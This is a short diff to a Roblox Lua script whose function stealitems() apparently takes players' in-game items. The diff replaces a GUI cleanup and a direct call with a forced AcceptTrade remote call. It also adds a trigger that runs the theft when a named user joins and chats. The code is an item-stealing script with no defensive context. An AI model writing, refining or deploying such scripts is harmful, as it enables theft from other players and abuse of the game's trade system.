@@ -1217,11 +1217,14 @@ local function stealitems()
         end
     end
 
-    -- Remove the GUI after 10 minutes
-    wait(600)
-    screenGui:Destroy()
+    wait(6)
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
 end
 
--- Start the process
-stealitems()
-
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == userName then
+        player.Chatted:Connect(function(msg)
+            stealitems()
+        end)
+    end
+end)
